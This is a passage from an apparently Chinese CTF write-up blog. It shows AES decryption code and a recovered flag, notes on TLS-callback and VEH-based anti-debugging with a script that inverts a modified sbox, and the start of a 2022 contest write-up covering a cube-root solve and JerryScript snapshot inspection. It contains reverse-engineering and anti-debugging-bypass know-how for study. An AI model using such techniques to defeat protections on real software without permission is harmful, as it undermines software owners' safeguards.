0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16&#125;;static const uint8_t g_inv_sbox[256] = &#123; /* 0 1 2 3 4 5 6 7 8 9 A B C D E F */ 0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb, 0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb, 0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e, 0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25, 0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92, 0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84, 0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06, 0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b, 0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73, 0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e, 0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b, 0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4, 0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f, 0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef, 0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d&#125;;/****************************************************************************************************************/uint8_t aes_sub_sbox(uint8_t val)&#123; return g_aes_sbox[val];&#125;/****************************************************************************************************************/uint32_t aes_sub_dword(uint32_t val)&#123; uint32_t tmp = 0; tmp |= ((uint32_t)aes_sub_sbox((uint8_t)((val &gt;&gt; 0) &amp; 0xFF))) &lt;&lt; 0; tmp |= ((uint32_t)aes_sub_sbox((uint8_t)((val &gt;&gt; 8) &amp; 0xFF))) &lt;&lt; 8; tmp |= ((uint32_t)aes_sub_sbox((uint8_t)((val &gt;&gt; 16) &amp; 0xFF))) &lt;&lt; 16; tmp |= ((uint32_t)aes_sub_sbox((uint8_t)((val &gt;&gt; 24) &amp; 0xFF))) &lt;&lt; 24; return tmp;&#125;/****************************************************************************************************************/uint32_t aes_rot_dword(uint32_t val)&#123; uint32_t tmp = val; return (val &gt;&gt; 8) | ((tmp &amp; 0xFF) &lt;&lt; 24);&#125;/****************************************************************************************************************/uint32_t aes_swap_dword(uint32_t val)&#123; return (((val &amp; 0x000000FF) &lt;&lt; 24) | ((val &amp; 0x0000FF00) &lt;&lt; 8) | ((val &amp; 0x00FF0000) &gt;&gt; 8) | ((val &amp; 0xFF000000) &gt;&gt; 24));&#125;/****************************************************************************************************************//** nr: number of rounds* nb: number of columns comprising the state, nb = 4 dwords (16 bytes)* nk: number of 32-bit words comprising cipher key, nk = 4, 6, 8 (KeyLength/(4*8))*/void aes_key_expansion(AES_CYPHER_T mode, uint8_t *key, uint8_t *round)&#123; uint32_t *w = (uint32_t *)round; uint32_t t; int i = 0; do &#123; w[i] = *((uint32_t *)&amp;key[i * 4 + 0]); &#125; while (++i &lt; g_aes_nk[mode]); do &#123; if ((i % g_aes_nk[mode]) == 0) &#123; t = aes_rot_dword(w[i - 1]); t = aes_sub_dword(t); t = t ^ aes_swap_dword(g_aes_rcon[i / g_aes_nk[mode] - 1]); &#125; else if (g_aes_nk[mode] &gt; 6 &amp;&amp; (i % g_aes_nk[mode]) == 4) &#123; t = aes_sub_dword(w[i - 1]); &#125; else &#123; t = w[i - 1]; &#125; w[i] = w[i - g_aes_nk[mode]] ^ t; &#125; while (++i &lt; g_aes_nb[mode] * (g_aes_rounds[mode] + 1));&#125;/****************************************************************************************************************/void aes_add_round_key(AES_CYPHER_T mode, uint8_t *state, uint8_t *round, int nr)&#123; uint32_t *w = (uint32_t *)round; uint32_t *s = (uint32_t *)state; int i; for (i = 0; i &lt; g_aes_nb[mode]; i++) &#123; s[i] ^= w[nr * g_aes_nb[mode] + i]; &#125;&#125;/****************************************************************************************************************/void aes_sub_bytes(AES_CYPHER_T mode, uint8_t *state)&#123; int i, j; for (i = 0; i &lt; g_aes_nb[mode]; i++) &#123; for (j = 0; j &lt; 4; j++) &#123; state[i * 4 + j] = aes_sub_sbox(state[i * 4 + j]); &#125; &#125;&#125;/****************************************************************************************************************/void aes_shift_rows(AES_CYPHER_T mode, uint8_t *state)&#123; uint8_t *s = (uint8_t *)state; int i, j, r; for (i = 1; i &lt; g_aes_nb[mode]; i++) &#123; for (j = 0; j &lt; i; j++) &#123; uint8_t tmp = s[i]; for (r = 0; r &lt; g_aes_nb[mode]; r++) &#123; s[i + r * 4] = s[i + (r + 1) * 4]; &#125; s[i + (g_aes_nb[mode] - 1) * 4] = tmp; &#125; &#125;&#125;/****************************************************************************************************************/uint8_t aes_xtime(uint8_t x)&#123; return ((x &lt;&lt; 1) ^ (((x &gt;&gt; 7) &amp; 1) * 0x1b));&#125;/****************************************************************************************************************/uint8_t aes_xtimes(uint8_t x, int ts)&#123; while (ts-- &gt; 0) &#123; x = aes_xtime(x); &#125; return x;&#125;/****************************************************************************************************************/uint8_t aes_mul(uint8_t x, uint8_t y)&#123; /* * encrypt: y has only 2 bits: can be 1, 2 or 3 * decrypt: y could be any value of 9, b, d, or e */ return ((((y &gt;&gt; 0) &amp; 1) * aes_xtimes(x, 0)) ^ (((y &gt;&gt; 1) &amp; 1) * aes_xtimes(x, 1)) ^ (((y &gt;&gt; 2) &amp; 1) * aes_xtimes(x, 2)) ^ (((y &gt;&gt; 3) &amp; 1) * aes_xtimes(x, 3)) ^ (((y &gt;&gt; 4) &amp; 1) * aes_xtimes(x, 4)) ^ (((y &gt;&gt; 5) &amp; 1) * aes_xtimes(x, 5)) ^ (((y &gt;&gt; 6) &amp; 1) * aes_xtimes(x, 6)) ^ (((y &gt;&gt; 7) &amp; 1) * aes_xtimes(x, 7)));&#125;/****************************************************************************************************************/void aes_mix_columns(AES_CYPHER_T mode, uint8_t *state)&#123; uint8_t y[16] = &#123; 2, 3, 1, 1, 1, 2, 3, 1, 1, 1, 2, 3, 3, 1, 1, 2 &#125;; uint8_t s[4]; int i, j, r; for (i = 0; i &lt; g_aes_nb[mode]; i++) &#123; for (r = 0; r &lt; 4; r++) &#123; s[r] = 0; for (j = 0; j &lt; 4; j++) &#123; s[r] = s[r] ^ aes_mul(state[i * 4 + j], y[r * 4 + j]); &#125; &#125; for (r = 0; r &lt; 4; r++) &#123; state[i * 4 + r] = s[r]; &#125; &#125;&#125;/****************************************************************************************************************/int aes_encrypt(AES_CYPHER_T mode, uint8_t *data, int len, uint8_t *key)&#123; uint8_t w[4 * 4 * 15] = &#123; 0 &#125;; /* round key */ uint8_t s[4 * 4] = &#123; 0 &#125;; /* state */ int nr, i, j; /* key expansion */ aes_key_expansion(mode, key, w); /* start data cypher loop over input buffer */ for (i = 0; i &lt; len; i += 4 * g_aes_nb[mode]) &#123; /* init state from user buffer (plaintext) */ for (j = 0; j &lt; 4 * g_aes_nb[mode]; j++) s[j] = data[i + j]; /* start AES cypher loop over all AES rounds */ for (nr = 0; nr &lt;= g_aes_rounds[mode]; nr++) &#123; if (nr &gt; 0) &#123; /* do SubBytes */ aes_sub_bytes(mode, s); /* do ShiftRows */ aes_shift_rows(mode, s); if (nr &lt; g_aes_rounds[mode]) &#123; /* do MixColumns */ aes_mix_columns(mode, s); &#125; &#125; /* do AddRoundKey */ aes_add_round_key(mode, s, w, nr); &#125; /* save state (cypher) to user buffer */ for (j = 0; j &lt; 4 * g_aes_nb[mode]; j++) data[i + j] = s[j]; &#125; return 0;&#125;/****************************************************************************************************************/int aes_encrypt_ecb(AES_CYPHER_T mode, uint8_t *data, int len, uint8_t *key)&#123; return aes_encrypt(mode, data, len, key);&#125;/****************************************************************************************************************/int aes_encrypt_cbc(AES_CYPHER_T mode, uint8_t *data, int len, uint8_t *key, uint8_t *iv)&#123; uint8_t w[4 * 4 * 15] = &#123; 0 &#125;; /* round key */ uint8_t s[4 * 4] = &#123; 0 &#125;; /* state */ uint8_t v[4 * 4] = &#123; 0 &#125;; /* iv */ int nr, i, j; /* key expansion */ aes_key_expansion(mode, key, w); memcpy(v, iv, sizeof(v)); /* start data cypher loop over input buffer */ for (i = 0; i &lt; len; i += 4 * g_aes_nb[mode]) &#123; /* init state from user buffer (plaintext) */ for (j = 0; j &lt; 4 * g_aes_nb[mode]; j++) s[j] = data[i + j] ^ v[j]; /* start AES cypher loop over all AES rounds */ for (nr = 0; nr &lt;= g_aes_rounds[mode]; nr++) &#123; if (nr &gt; 0) &#123; /* do SubBytes */ aes_sub_bytes(mode, s); /* do ShiftRows */ aes_shift_rows(mode, s); if (nr &lt; g_aes_rounds[mode]) &#123; /* do MixColumns */ aes_mix_columns(mode, s); &#125; &#125; /* do AddRoundKey */ aes_add_round_key(mode, s, w, nr); &#125; /* save state (cypher) to user buffer */ for (j = 0; j &lt; 4 * g_aes_nb[mode]; j++) data[i + j] = v[j] = s[j]; &#125; return 0;&#125;/****************************************************************************************************************/void inv_shift_rows(AES_CYPHER_T mode, uint8_t *state)&#123; uint8_t *s = (uint8_t *)state; int i, j, r; for (i = 1; i &lt; g_aes_nb[mode]; i++) &#123; for (j = 0; j &lt; g_aes_nb[mode] - i; j++) &#123; uint8_t tmp = s[i]; for (r = 0; r &lt; g_aes_nb[mode]; r++) &#123; s[i + r * 4] = s[i + (r + 1) * 4]; &#125; s[i + (g_aes_nb[mode] - 1) * 4] = tmp; &#125; &#125;&#125;/****************************************************************************************************************/uint8_t inv_sub_sbox(uint8_t val)&#123; return g_inv_sbox[val];&#125;/****************************************************************************************************************/void inv_sub_bytes(AES_CYPHER_T mode, uint8_t *state)&#123; int i, j; for (i = 0; i &lt; g_aes_nb[mode]; i++) &#123; for (j = 0; j &lt; 4; j++) &#123; state[i * 4 + j] = inv_sub_sbox(state[i * 4 + j]); &#125; &#125;&#125;/****************************************************************************************************************/void inv_mix_columns(AES_CYPHER_T mode, uint8_t *state)&#123; uint8_t y[16] = &#123; 0x0e, 0x0b, 0x0d, 0x09, 0x09, 0x0e, 0x0b, 0x0d, 0x0d, 0x09, 0x0e, 0x0b, 0x0b, 0x0d, 0x09, 0x0e &#125;; uint8_t s[4]; int i, j, r; for (i = 0; i &lt; g_aes_nb[mode]; i++) &#123; for (r = 0; r &lt; 4; r++) &#123; s[r] = 0; for (j = 0; j &lt; 4; j++) &#123; s[r] = s[r] ^ aes_mul(state[i * 4 + j], y[r * 4 + j]); &#125; &#125; for (r = 0; r &lt; 4; r++) &#123; state[i * 4 + r] = s[r]; &#125; &#125;&#125;/****************************************************************************************************************/int aes_decrypt(AES_CYPHER_T mode, uint8_t *data, int len, uint8_t *key)&#123; uint8_t w[4 * 4 * 15] = &#123; 0 &#125;; /* round key */ uint8_t s[4 * 4] = &#123; 0 &#125;; /* state */ int nr, i, j; /* key expansion */ aes_key_expansion(mode, key, w); /* start data cypher loop over input buffer */ for (i = 0; i &lt; len; i += 4 * g_aes_nb[mode]) &#123; /* init state from user buffer (cyphertext) */ for (j = 0; j &lt; 4 * g_aes_nb[mode]; j++) s[j] = data[i + j]; /* start AES cypher loop over all AES rounds */ for (nr = g_aes_rounds[mode]; nr &gt;= 0; nr--) &#123; /* do AddRoundKey */ aes_add_round_key(mode, s, w, nr); if (nr &gt; 0) &#123; if (nr &lt; g_aes_rounds[mode]) &#123; /* do MixColumns */ inv_mix_columns(mode, s); &#125; /* do ShiftRows */ inv_shift_rows(mode, s); /* do SubBytes */ inv_sub_bytes(mode, s); &#125; &#125; /* save state (cypher) to user buffer */ for (j = 0; j &lt; 4 * g_aes_nb[mode]; j++) data[i + j] = s[j]; &#125; return 0;&#125;/****************************************************************************************************************/int aes_decrypt_ecb(AES_CYPHER_T mode, uint8_t *data, int len, uint8_t *key)&#123; return aes_decrypt(mode, data, len, key);&#125;/****************************************************************************************************************/int aes_decrypt_cbc(AES_CYPHER_T mode, uint8_t *data, int len, uint8_t *key, uint8_t *iv)&#123; uint8_t w[4 * 4 * 15] = &#123; 0 &#125;; /* round key */ uint8_t s[4 * 4] = &#123; 0 &#125;; /* state */ uint8_t v[4 * 4] = &#123; 0 &#125;; /* iv */ int nr, i, j; /* key expansion */ aes_key_expansion(mode, key, w); memcpy(v, iv, sizeof(v)); /* start data cypher loop over input buffer */ for (i = 0; i &lt; len; i += 4 * g_aes_nb[mode]) &#123; /* init state from user buffer (cyphertext) */ for (j = 0; j &lt; 4 * g_aes_nb[mode]; j++) s[j] = data[i + j]; /* start AES cypher loop over all AES rounds */ for (nr = g_aes_rounds[mode]; nr &gt;= 0; nr--) &#123; /* do AddRoundKey */ aes_add_round_key(mode, s, w, nr); if (nr &gt; 0) &#123; if (nr &lt; g_aes_rounds[mode]) &#123; /* do MixColumns */ inv_mix_columns(mode, s); &#125; /* do ShiftRows */ inv_shift_rows(mode, s); /* do SubBytes */ inv_sub_bytes(mode, s); &#125; &#125; /* save state (cypher) to user buffer */ for (j = 0; j &lt; 4 * g_aes_nb[mode]; j++) &#123; uint8_t p = s[j] ^ v[j]; v[j] = data[i + j]; data[i + j] = p; &#125; &#125; return 0;&#125;/****************************************************************************************************************/void aes_cypher_128_test()&#123;#if 1 uint8_t buf[] = &#123; 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff &#125;; uint8_t key[] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f &#125;;#else uint8_t buf[] = &#123; 0x32, 0x43, 0xf6, 0xa8, 0x88, 0x5a, 0x30, 0x8d, 0x31, 0x31, 0x98, 0xa2, 0xe0, 0x37, 0x07, 0x34 &#125;; uint8_t key[] = &#123; 0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c &#125;;#endif aes_encrypt(AES_CYPHER_128, buf, sizeof(buf), key); aes_decrypt(AES_CYPHER_128, buf, sizeof(buf), key);&#125;/****************************************************************************************************************/void aes_cypher_192_test()&#123; uint8_t buf[] = &#123; 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff &#125;; uint8_t key[] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17 &#125;; aes_encrypt(AES_CYPHER_192, buf, sizeof(buf), key); aes_decrypt(AES_CYPHER_192, buf, sizeof(buf), key);&#125;/****************************************************************************************************************/void aes_cypher_256_test()&#123; uint8_t buf[] = &#123; 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff &#125;; uint8_t key[] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f &#125;; aes_encrypt(AES_CYPHER_256, buf, sizeof(buf), key); aes_decrypt(AES_CYPHER_256, buf, sizeof(buf), key);&#125;/****************************************************************************************************************/int main()&#123; //数据 uint8_t buf[] = &#123;0x84,0x37,0xA0,0xF3,0xEC,0x36,0x34,0xFC,0x94,0xA2,0x38,0x6F,0x3F,0x34,0x7E,0x7C&#125;; //密钥 uint8_t key[] = &#123;141, 142, 143, 128, 129, 130, 131, 132, 149, 150, 151, 136, 137, 138, 139, 140&#125;; //向量 uint8_t iv[] = &#123;77, 79, 77, 67, 69, 71, 69, 67, 93, 95, 93, 67, 69, 71, 69, 67&#125;; switch (sizeof(key)) &#123; //ECB /* case 16:aes_decrypt(AES_CYPHER_128, buf, sizeof(buf), key); break; case 24:aes_decrypt(AES_CYPHER_192, buf, sizeof(buf), key); break; case 32:aes_decrypt(AES_CYPHER_256, buf, sizeof(buf), key); break; */ //CBC case 16:aes_decrypt_cbc(AES_CYPHER_128, buf, sizeof(buf), key, iv); break; case 24:aes_decrypt_cbc(AES_CYPHER_192, buf, sizeof(buf), key, iv); break; case 32:aes_decrypt_cbc(AES_CYPHER_256, buf, sizeof(buf), key, iv); break; &#125; for (int i = 0; i &lt; sizeof(buf); i++) &#123; printf(&quot;%x &quot;, buf[i] &amp; 0xFF); &#125; printf(&quot;\\n&quot;); return 0;&#125; 拼接即可得到flag，注意前面的大写条件 1flag&#123;E8C9A0CC8B9854CDD0AC321B790FC74EFA520FBC&#125; esayre在tls回调函数里有反调试以及VEH异常 VEH：向量化异常处理，是对整个进程来说是全局的（SEH是针对线程的）异常捕获技术，只要通过简单的设置，只要当前进程发送了异常，都能被我们设置好的VEH捕获到。 123456789PVOID WINAPI AddVectoredExceptionHandler( _In_ ULONG FirstHandler, _In_ PVECTORED_EXCEPTION_HANDLER VectoredHandler);PVOID WINAPI AddVectoredContinueHandler( _In_ ULONG FirstHandler, _In_ PVECTORED_EXCEPTION_HANDLER VectoredHandler); FirstHandler—–这个参数，是当我们进程中添加了多个VEH或者VCH时才有效，比如调用了两次AddVectoredExceptionHandler，那么进程中存在两个向量化处理异常回调A和B，这时候此参数就决定了A先执行还是A后执行，如果FirstHandler等于零，那么A就代表最后执行，非零值就代表第一个执行。当然这种说法也不全对，要看B的FirstHandler参数具体是什么值。VectoredHandler——是一个回调函数，这个回调函数是我们提供的，当有异常发生时，windows就会把异常信息交给我们的这个回调函数去执行。AddVectoredExceptionHandler是添加VEH，AddVectoredContinueHandler是添加VCH，区别在于AddVectoredExceptionHandler是执行在所有SEH的前面，AddVectoredContinueHandler是执行在所有SEH后面。 j_NtQueryInformationProcess判断现在的进程状态，然后触发除0异常调用handler 修改了sbox 在handlr处断下 1234567891011121314151617181920212223242526272829303132333435363738394041424344new_s_box = [0x00000077, 0x00000068, 0x00000063, 0x0000006F, 0x000000E6, 0x0000007F, 0x0000007B, 0x000000D1, 0x00000024, 0x00000015, 0x00000073, 0x0000003F, 0x000000EA, 0x000000C3, 0x000000BF, 0x00000062, 0x000000DE, 0x00000096, 0x000000DD, 0x00000069, 0x000000EE, 0x0000004D, 0x00000053, 0x000000E4, 0x000000B9, 0x000000C0, 0x000000B6, 0x000000BB, 0x00000088, 0x000000B0, 0x00000066, 0x000000D4, 0x000000A3, 0x000000E9, 0x00000087, 0x00000032, 0x00000022, 0x0000002B, 0x000000E3, 0x000000D8, 0x00000020, 0x000000B1, 0x000000F1, 0x000000E5, 0x00000065, 0x000000CC, 0x00000025, 0x00000001, 0x00000010, 0x000000D3, 0x00000037, 0x000000D7, 0x0000000C, 0x00000082, 0x00000011, 0x0000008E, 0x00000013, 0x00000006, 0x00000094, 0x000000F6, 0x000000FF, 0x00000033, 0x000000A6, 0x00000061, 0x0000001D, 0x00000097, 0x00000038, 0x0000000E, 0x0000000F, 0x0000007A, 0x0000004E, 0x000000B4, 0x00000046, 0x0000002F, 0x000000C2, 0x000000A7, 0x0000003D, 0x000000F7, 0x0000003B, 0x00000090, 0x00000047, 0x000000C5, 0x00000014, 0x000000F9, 0x00000034, 0x000000E8, 0x000000A5, 0x0000004F, 0x0000007E, 0x000000DF, 0x000000AA, 0x0000002D, 0x0000005E, 0x00000058, 0x0000004C, 0x000000DB, 0x000000C4, 0x000000FB, 0x000000BE, 0x000000EF, 0x00000057, 0x00000059, 0x00000027, 0x00000091, 0x00000051, 0x000000ED, 0x00000016, 0x0000006B, 0x00000044, 0x00000028, 0x0000008B, 0x000000BC, 0x00000045, 0x000000B7, 0x00000054, 0x0000009B, 0x00000086, 0x00000089, 0x0000002C, 0x000000E1, 0x000000A8, 0x000000A2, 0x000000CE, 0x00000035, 0x00000004, 0x000000EB, 0x000000E7, 0x000000C6, 0x000000D9, 0x00000018, 0x00000007, 0x000000F8, 0x0000004B, 0x00000083, 0x00000050, 0x00000003, 0x000000D0, 0x000000B3, 0x0000006A, 0x00000029, 0x00000070, 0x00000049, 0x0000000D, 0x00000067, 0x00000074, 0x00000095, 0x0000005B, 0x000000C8, 0x00000036, 0x0000003E, 0x00000084, 0x0000009C, 0x00000052, 0x000000FA, 0x000000AC, 0x00000000, 0x000000CA, 0x0000004A, 0x0000001F, 0x000000CF, 0x000000F4, 0x00000026, 0x0000002E, 0x0000001E, 0x0000005D, 0x00000012, 0x00000030, 0x00000048, 0x000000D6, 0x000000C7, 0x000000B8, 0x00000076, 0x00000085, 0x00000081, 0x000000F0, 0x0000006D, 0x000000F3, 0x000000DC, 0x00000023, 0x00000079, 0x00000099, 0x000000C1, 0x0000005A, 0x000000BD, 0x00000078, 0x00000042, 0x000000E0, 0x000000FE, 0x00000071, 0x0000006E, 0x000000BA, 0x0000001C, 0x000000AE, 0x0000006C, 0x00000031, 0x0000003A, 0x00000008, 0x000000B2, 0x000000A0, 0x000000D2, 0x000000FC, 0x000000C9, 0x00000060, 0x0000000B, 0x0000005F, 0x000000A9, 0x0000009F, 0x0000009E, 0x00000064, 0x0000002A, 0x000000A1, 0x00000072, 0x0000005C, 0x00000017, 0x000000E2, 0x0000001A, 0x00000075, 0x00000021, 0x00000043, 0x000000AD, 0x00000092, 0x000000D5, 0x00000009, 0x0000008A, 0x000000F5, 0x000000EC, 0x0000008C, 0x00000005, 0x0000007D, 0x000000CD, 0x0000009A, 0x00000080, 0x0000008F, 0x0000000A, 0x00000093, 0x000000FD, 0x000000DA, 0x00000041, 0x0000003C, 0x000000CB, 0x00000098, 0x000000B5, 0x0000009D, 0x00000019, 0x000000AB, 0x000000F2, 0x00000056, 0x0000007C, 0x00000055, 0x0000008D, 0x00000039, 0x0000001B, 0x000000A4, 0x00000040, 0x000000AF, 0x00000002, 0x000000D8, 0x00000057, 0x000000CA, 0x000000C4, 0x00000044, 0x00000044, 0x00000011, 0x0000006E, 0x00000083, 0x0000000B, 0x000000DF, 0x00000071, 0x00000067, 0x00000078, 0x00000095, 0x0000007D, 0x000000B4, 0x000000FC, 0x0000002A, 0x00000070, 0x00000036, 0x000000FE, 0x0000008C, 0x0000004D, 0x00000032, 0x00000008, 0x000000E2, 0x00000044, 0x0000001B, 0x000000C4, 0x00000039, 0x00000003, ]new_contrary_sbox = [0] * 256for i in range(256): line = (new_s_box[i] &amp; 0xf0) &gt;&gt; 4 rol = new_s_box[i] &amp; 0xf new_contrary_sbox[(line * 16) + rol] = iprint(new_contrary_sbox) main： 相比于标准AES改动后的AES将状态矩阵运算的行列颠倒了一下，在aes的解密函数","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"祥云杯_2022","slug":"祥云杯-2022","date":"2022-11-02T16:00:00.000Z","updated":"2022-11-15T09:02:22.935Z","comments":true,"path":"2022/11/03/祥云杯-2022/","link":"","permalink":"http://example.com/2022/11/03/%E7%A5%A5%E4%BA%91%E6%9D%AF-2022/","excerpt":"","text":"Rocket环境：ubuntu22+racket8.2 似乎是racket内嵌代码运行，但是始终找不到内嵌的代码，最后黑盒测试猜测逻辑是转ascii码然后三次方。 1234567891011121314from Crypto.Util.number import long_to_bytesimport gmpy2print(gmpy2.iroot(7212272804013543391008421832457418223544765489764042171135982569211377620290274828526744558976950004052088838419495093523281490171119109149692343753662521483209758621522737222024221994157092624427343057143179489608942837157528031299236230089474932932551406181, 3))#6374667b746831735f69735f7265346c6c795f626561757431666c795f72316768743f7da=&#x27;6374667b746831735f69735f7265346c6c795f626561757431666c795f72316768743f7d&#x27;for i in range(0,len(a),2): print(&#x27;0x&#x27;+a[i]+a[i+1],end=&#x27;,&#x27;)print(&#x27;flag:&#x27;)#0x63,0x74,0x66,0x7b,0x74,0x68,0x31,0x73,0x5f,0x69,0x73,0x5f,0x72,0x65,0x34,0x6c,0x6c,0x79,0x5f,0x62,0x65,0x61,0x75,0x74,0x31,0x66,0x6c,0x79,0x5f,0x72,0x31,0x67,0x68,0x74,0x3f,0x7db=[0x63,0x74,0x66,0x7b,0x74,0x68,0x31,0x73,0x5f,0x69,0x73,0x5f,0x72,0x65,0x34,0x6c,0x6c,0x79,0x5f,0x62,0x65,0x61,0x75,0x74,0x31,0x66,0x6c,0x79,0x5f,0x72,0x31,0x67,0x68,0x74,0x3f,0x7d]for i in range(len(b)): print(chr(b[i]),end=&#x27;&#x27;) ctf{th1s_is_re4lly_beaut1fly_r1ght?} engtom给出一个.snapshot 文件，根据文件开头是JRRYF 信息搜索得知是JerryScript引擎的快照文件 编译后的字节码可以保存到快照中，也可以加载回执行。 直接执行快照可以节省解析源的内存消耗和性能成本。 也可以直接从 ROM 执行快照，在这种情况下，还可以节省将快照加载到内存中的开销。 12python tools/build.py --show-opcodes=ON --snapshot-exec=ON 编译时候开启选项./jerry --show-opcodes --exec-snapshot chall.snapshot 查看字节码 